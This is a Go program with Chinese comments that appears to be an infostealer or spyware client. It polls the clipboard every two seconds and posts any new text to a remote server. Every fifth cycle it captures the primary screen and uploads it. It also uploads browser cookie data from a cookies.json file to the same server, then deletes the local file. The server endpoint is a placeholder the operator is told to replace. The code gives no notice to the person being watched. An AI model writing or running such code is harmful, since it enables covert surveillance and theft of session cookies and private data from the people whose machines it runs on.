package main

import (
	"bytes"
	"fmt"
	"image/png"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"time"

	"github.com/kbinani/screenshot"
	"golang.design/x/clipboard"
)

// --- 配置 ---
// !!!重要!!!: 请将这里的 IP 地址和端口替换为你的服务器的实际地址。
const serverEndpoint = "http://localhost:5656"
const uploadClipboardURL = serverEndpoint + "/api/clipboard"
const uploadScreenshotURL = serverEndpoint + "/api/screenshot"
const uploadCookiesURL = serverEndpoint + "/api/cookies"

// 监控频率
const checkInterval = 2 * time.Second

var lastClipboardContent = ""

func main() {
	// 初始化剪贴板
	err := clipboard.Init()
	if err != nil {
		log.Panicf("无法初始化剪贴板: %v", err)
	}

	log.Println("监控程序已启动...")

	// 创建一个定时器
	ticker := time.NewTicker(checkInterval)
	defer ticker.Stop()

	// 立即执行一次，避免启动时等待
	runChecks()
	i := 0
	// 循环执行
	for range ticker.C {
		checkAndUploadClipboard()
		i++
		if i == 5 {
			captureAndUploadScreen()
			i = 0
		}
	}

}

func runChecks() {
	// 检查并上传剪贴板
	checkAndUploadClipboard()
	// 截屏并上传
	captureAndUploadScreen()
	// 获取json
	OutJson()
	// 上传json
	waitForNetworkAndUploadCookies()
}

// 检查剪贴板内容，如果变化则上传
func checkAndUploadClipboard() {
	// 读取剪贴板中的文本内容
	content := clipboard.Read(clipboard.FmtText)

	currentContent := string(content)

	// 与上一次内容比较，如果不同则上传
	if currentContent != "" && currentContent != lastClipboardContent {
		log.Printf("检测到新的剪贴板内容: %s", currentContent)
		err := uploadText(uploadClipboardURL, currentContent)
		if err != nil {
			log.Printf("上传剪贴板内容失败: %v", err)
		} else {
			// 上传成功后更新缓存
			lastClipboardContent = currentContent
			log.Println("剪贴板内容上传成功。")
		}
	}
}

// 截取屏幕并上传
func captureAndUploadScreen() {
	// 获取所有屏幕的数量
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		log.Println("没有找到活动的显示器。")
		return
	}

	// 我们只截取主屏幕 (索引为 0)
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		log.Printf("截取屏幕失败: %v", err)
		return
	}

	// 将 image.RGBA 转换为 []byte
	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		log.Printf("PNG 编码失败: %v", err)
		return
	}

	// 上传图片
	err = uploadFile(uploadScreenshotURL, "screenshot.png", &buf)
	if err != nil {
		log.Printf("上传屏幕截图失败: %v", err)
	} else {
		log.Println("屏幕截图上传成功。")
	}
}

// waitForNetworkAndUploadCookies 等待网络连接并上传 Cookie 数据
// 这个函数应该在程序启动时作为一个 goroutine 运行
func waitForNetworkAndUploadCookies() {
	const retryInterval = 30 * time.Second // 网络不通时，每30秒重试一次

	log.Println("Cookie 上传任务已启动，正在等待网络连接...")

	for {
		// 1. 检查到服务器的网络连接
		// 我们通过尝试访问服务器端点来判断网络是否可用
		_, err := http.Head(serverEndpoint)
		if err != nil {
			log.Printf("网络连接不可用或服务器无法访问: %v。将在 %v 后重试...", err, retryInterval)
			time.Sleep(retryInterval)
			continue // 继续下一次循环检查
		}

		log.Println("网络连接成功，准备上传 Cookie。")

		// 2. 检查 cookies.json 文件是否存在
		if _, err := os.Stat("cookies.json"); os.IsNotExist(err) {
			log.Printf("cookies.json 文件不存在，等待文件创建...")
			time.Sleep(retryInterval)
			continue
		}

		// 3. 调用 convertCookiesJSON 进行转换
		cookieData, err := ConvertCookiesJSON()
		if err != nil {
			log.Printf("处理 cookies.json 文件时出错: %v", err)
			time.Sleep(retryInterval) // 文件可能格式不正确，稍后重试
			continue
		}

		// 如果 cookieData 为空，说明文件可能是空的，也等待下一次
		if len(cookieData) == 0 {
			log.Println("cookies.json 文件为空，等待内容写入...")
			time.Sleep(retryInterval)
			continue
		}

		// 4. 调用 uploadJSON 上传数据
		if err := uploadJSON(uploadCookiesURL, cookieData); err != nil {
			log.Printf("上传 cookie 数据失败: %v", err)
			time.Sleep(retryInterval) // 上传失败，稍后重试
			continue
		}

		log.Println("Cookie 数据已成功上传。")

		// 5. 【新增逻辑】删除 cookies.json 文件
		err = os.Remove("cookies.json")
		if err != nil {
			// 如果删除失败，只记录错误日志，但任务仍视为完成，因为上传是主要目标
			log.Printf("警告：成功上传数据后，删除 cookies.json 文件失败: %v", err)
		} else {
			log.Println("本地 cookies.json 文件已成功删除。")
		}

		log.Println("任务完成。")
		break // 成功上传并处理文件后，退出循环
	}
}

// 上传文本内容的通用函数
func uploadText(url string, text string) error {
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(text))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "text/plain")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %s, %s", resp.Status, string(body))
	}
	return nil
}

func uploadJSON(url string, data []byte) error {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	// 设置正确的 Content-Type
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %s, %s", resp.Status, string(body))
	}
	return nil
}

// 上传文件的通用函数
func uploadFile(url string, filename string, filedata io.Reader) error {
	var b bytes.Buffer
	w := multipart.NewWriter(&b)

	// 创建一个 form-data 字段
	fw, err := w.CreateFormFile("upload", filename)
	if err != nil {
		return err
	}

	// 将文件内容拷贝到 form-data 字段
	if _, err = io.Copy(fw, filedata); err != nil {
		return err
	}

	// 必须关闭 writer，这样才会写入结尾的 boundary
	w.Close()

	req, err := http.NewRequest("POST", url, &b)
	if err != nil {
		return err
	}
	// 设置 Content-Type，这里包含了 multipart/form-data 的 boundary
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %s, %s", resp.Status, string(body))
	}
	return nil
}
